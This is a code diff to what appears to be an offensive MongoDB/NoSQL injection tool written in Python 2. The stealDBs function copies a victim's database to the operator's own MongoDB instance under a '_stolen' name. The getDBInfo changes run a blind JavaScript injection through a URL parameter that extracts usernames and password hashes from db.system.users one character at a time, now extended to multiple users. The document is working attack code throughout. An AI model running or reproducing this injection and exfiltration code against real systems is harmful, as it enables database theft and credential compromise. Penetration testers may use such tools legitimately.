@@ -968,6 +968,9 @@ def buildUri(origUri, randValue):
 	uriArray[17] = uriArray[17][:-1]
 	return uriArray[0]
 
+def buildPostData(body):
+	print "Post data crap goes here."
+	
 def stealDBs(myDB):
 	menuItem = 1	
 	
@@ -986,7 +989,11 @@ def stealDBs(myDB):
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
 		
-		if dbNeedCreds == "n" or dbNeedCreds == "N":	
+		if dbNeedCreds == "n" or dbNeedCreds == "N":
+			if optionSet[4] == False:
+				raw_input("No IP specified to copy to! Press enter to return to main menu...")
+				mainMenu()
+			
 			myDBConn = pymongo.MongoClient(myDB,27017)
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		
@@ -1008,6 +1015,7 @@ def stealDBs(myDB):
 			return()
 	
 	except:
+		#print str(sys.exc_info())
 		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
 		mainMenu()
 	
@@ -1212,62 +1220,123 @@ def getDBInfo():
 		charCounterUsr = 0 #position in the character array-Username
 		rightCharsUsr = 0 #number of correct characters-Username
 		rightCharsHash = 0 #number of correct characters-hash
-		charCounterHash = 0
+		charCounterHash = 0 #position in the character array-hash
 		username = ""
 		pwdHash = ""
 		charCountUsr = False
 		query = "{}"
 		
 		while retrUsers < usrCount:
-				if retrUsers == 0:
-					while charCountUsr == False:
-						#different query to get the first user vs. others
-						usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
-						lenUri = int(len(urllib.urlopen(usrUri).read()))
+			if retrUsers == 0:
+				while charCountUsr == False:
+					#different query to get the first user vs. others
+					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+					lenUri = int(len(urllib.urlopen(usrUri).read()))
 				
-						if lenUri == baseLen:
-							#Got the right number of characters
-							charCountUsr = True
+					if lenUri == baseLen:
+						#Got the right number of characters
+						charCountUsr = True
 				
-						else:
-							usrChars += 1
+					else:
+						usrChars += 1
 					
-					while  rightCharsUsr < usrChars:
-						usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } vardum='a" + "&")
-						lenUri = int(len(urllib.urlopen(usrUri).read()))
+				while  rightCharsUsr < usrChars:
+					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
+					lenUri = int(len(urllib.urlopen(usrUri).read()))
 						
-						if lenUri == baseLen:
-							username = username + chars[charCounterUsr]
-							#print username
-							rightCharsUsr += 1
-							charCounterUsr = 0				
+					if lenUri == baseLen:
+						username = username + chars[charCounterUsr]
+						#print username
+						rightCharsUsr += 1
+						charCounterUsr = 0				
 				
-						else:
-							charCounterUsr += 1
+					else:
+						charCounterUsr += 1
 				
-					retrUsers += 1
-					users.append(username)
-					#print str(retrUsers)
-					#print str(users)
-					
-					while rightCharsHash < 32:  #Hash length is static
-						hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
-						lenUri = int(len(urllib.urlopen(hashUri).read()))
+				retrUsers += 1
+				users.append(username)
+				#reinitialize all variables and get ready to do it again
+				#print str(retrUsers)
+				#print str(users)
+				charCountUsr = False
+				rightCharsUsr = 0
+				usrChars = 0
+				username = ""
+				
+				while rightCharsHash < 32:  #Hash length is static
+					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
+					lenUri = int(len(urllib.urlopen(hashUri).read()))
 						
-						if lenUri == baseLen:
-							pwdHash = pwdHash + chars[charCounterHash]
-							#print pwdHash
-							rightCharsHash += 1
-							charCounterHash = 0
+					if lenUri == baseLen:
+						pwdHash = pwdHash + chars[charCounterHash]
+						#print pwdHash
+						rightCharsHash += 1
+						charCounterHash = 0
 							
-						else:
-							charCounterHash += 1
+					else:
+						charCounterHash += 1
 						
-					hashes.append(pwdHash)
-					print "Got user:hash " + users[0] + ":" + hashes[0]
+				hashes.append(pwdHash)
+				print "Got user:hash " + users[0] + ":" + hashes[0]
+				#reinitialize all variables and get ready to do it again
+				charCounterHash = 0
+				rightCharsHash = 0
+				pwdHash = ""
+			else:
+				while charCountUsr == False:
+					#different query to get the first user vs. others
+					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+					lenUri = int(len(urllib.urlopen(usrUri).read()))
+				
+					if lenUri == baseLen:
+						#Got the right number of characters
+						charCountUsr = True
+				
+					else:
+						usrChars += 1
 					
-				else:
-					print "more users go here."
+				while  rightCharsUsr < usrChars:
+					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")	
+					lenUri = int(len(urllib.urlopen(usrUri).read()))
+						
+					if lenUri == baseLen:
+						username = username + chars[charCounterUsr]
+						#print username
+						rightCharsUsr += 1
+						charCounterUsr = 0				
+				
+					else:
+						charCounterUsr += 1
+				
+				retrUsers += 1
+				#reinitialize all variables and get ready to do it again
+				
+				charCountUsr = False
+				rightCharsUsr = 0
+				usrChars = 0
+				
+
+				while rightCharsHash < 32:  #Hash length is static
+					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
+					lenUri = int(len(urllib.urlopen(hashUri).read()))
+						
+					if lenUri == baseLen:
+						pwdHash = pwdHash + chars[charCounterHash]
+						#print pwdHash
+						rightCharsHash += 1
+						charCounterHash = 0
+							
+					else:
+						charCounterHash += 1
+						
+				users.append(username)
+				hashes.append(pwdHash)
+				print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
+				#reinitialize all variables and get ready to do it again
+				username = ""
+				charCounterHash = 0
+				rightCharsHash = 0
+				pwdHash = ""
 		
 		
 		
@@ -1277,6 +1346,6 @@ def getDBInfo():
 def signal_handler(signal, frame):
     print "\n"
     print "CTRL+C detected.  Exiting."
-    sys.exit(0)
+    sys.exit()
 signal.signal(signal.SIGINT, signal_handler)
 mainMenu()
